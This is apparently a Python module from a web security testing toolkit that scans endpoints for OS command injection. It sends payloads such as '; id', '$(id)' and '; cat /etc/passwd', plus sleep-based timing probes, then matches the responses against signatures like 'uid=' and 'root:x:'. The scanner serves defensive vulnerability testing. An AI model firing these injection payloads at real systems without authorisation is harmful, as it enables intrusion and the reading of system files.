#!/usr/bin/env python3
"""
cmdi.py — OS command injection detection (P1)
==============================================
Sends shell-metacharacter payloads into a parameter and looks for command
output echoed in the response (error-based) or a measurable delay (time-based).
Pure checkers are unit-testable; only ``test_endpoint``/``run_cmdi`` do I/O.
"""
from __future__ import annotations

import asyncio
import re
import time
from dataclasses import dataclass, field
from typing import Any

try:
    from toolkit.infra.finding import NormalizedFinding, compute_finding_id
    from toolkit.infra import inject
    _HAVE_FINDING = True
except Exception:  # pragma: no cover
    _HAVE_FINDING = False


_ERROR_PAYLOADS = ["; id", "| id", "$(id)", "`id`", "; cat /etc/passwd"]
_TIME_PAYLOADS = ["; sleep 3", "| sleep 3", "$(sleep 3)", "`sleep 3`"]

# Output signatures that strongly imply command execution.
_OUT_SIGS = ["uid=", "gid=", "groups=", "root:x:", "bin/bash", "daemon:x:"]


def _detect_cmd_output(text: str) -> str:
    low = (text or "").lower()
    for s in _OUT_SIGS:
        if s in low:
            return s
    return ""


@dataclass
class CmdFinding:
    url: str
    method: str
    param: str
    technique: str
    payload: str
    evidence: str = ""

    def to_dict(self) -> dict:
        return self.__dict__.copy()


async def _send(client, endpoint: Any, param: str, value: str, *,
                timeout: float = 10.0) -> tuple[int, str, float]:
    via = getattr(endpoint, "inject_via", "query")
    headers = {"User-Agent": "Mozilla/5.0 (compatible; BBTK-cmdi/1.0)"}
    t0 = time.monotonic()
    try:
        if via == "body_form":
            r = await client.request(endpoint.method, endpoint.url, headers=headers,
                                     data={param: value}, timeout=timeout)
        elif via == "body_json":
            r = await client.request(endpoint.method, endpoint.url,
                                     headers={**headers, "Content-Type": "application/json"},
                                     json={param: value}, timeout=timeout)
        else:
            full = inject.build_injection_url(endpoint.url, param, value)
            r = await client.request(endpoint.method, full, headers=headers, timeout=timeout)
        body = getattr(r, "text", "") or ""
        status = int(getattr(r, "status_code", 0) or 0)
    except Exception:
        return 0, "", time.monotonic() - t0
    return status, body, time.monotonic() - t0


async def test_endpoint(endpoint: Any, client: object, *,
                        timeout: float = 10.0,
                        time_threshold: float = 2.5) -> list[CmdFinding]:
    params = list(getattr(endpoint, "params", []) or [])
    if not params:
        return []
    out: list[CmdFinding] = []
    seen: set[str] = set()
    for param in params:
        for p in _ERROR_PAYLOADS:
            _, body, _ = await _send(client, endpoint, param, p, timeout=timeout)
            sig = _detect_cmd_output(body)
            if sig:
                if param not in seen:
                    seen.add(param)
                    out.append(CmdFinding(endpoint.url, endpoint.method, param, "output",
                                          p, f"command output signature '{sig}' in response"))
                break
        if param in seen:
            continue
        for p in _TIME_PAYLOADS:
            _, _, elapsed = await _send(client, endpoint, param, p, timeout=timeout)
            if elapsed >= time_threshold:
                if param not in seen:
                    seen.add(param)
                    out.append(CmdFinding(endpoint.url, endpoint.method, param, "time",
                                          p, f"response delay {elapsed:.2f}s"))
                break
    return out


async def run_cmdi(endpoints: list[Any], client: object, *,
                   timeout: float = 10.0, concurrency: int = 10) -> list[CmdFinding]:
    sem = asyncio.Semaphore(concurrency)

    async def guarded(ep):
        async with sem:
            return await test_endpoint(ep, client, timeout=timeout)
    results = await asyncio.gather(*[guarded(ep) for ep in endpoints])
    return [f for sub in results for f in sub]


def to_normalized_findings(findings: list[CmdFinding],
                           source_tool: str = "cmdi.py") -> list[dict]:
    out: list[dict] = []
    for f in findings:
        severity = "HIGH"
        detail = (f"OS command injection via {f.technique} on parameter "
                  f"'{f.param}' ({f.method} {f.url})")
        if _HAVE_FINDING:
            nf = NormalizedFinding(source_tool=source_tool, host=_host(f.url), url=f.url,
                                   vuln_class_key="COMMAND_INJECTION", severity=severity,
                                   title=f"Command Injection ({f.technique}) in {f.param}",
                                   detail=detail, evidence=f"payload={f.payload} {f.evidence}",
                                   confidence="confirmed" if f.technique == "output" else "probable")
            d = nf.to_dict()
            d["param"] = f.param
        else:
            d = {"source_tool": source_tool, "host": _host(f.url), "url": f.url,
                 "param": f.param, "vuln_class_key": "COMMAND_INJECTION", "severity": severity,
                 "title": f"Command Injection ({f.technique}) in {f.param}",
                 "detail": detail, "evidence": f.payload,
                 "confidence": "confirmed" if f.technique == "output" else "probable"}
        out.append(d)
    return out


def _host(url: str) -> str:
    from urllib.parse import urlparse
    return urlparse(url).netloc
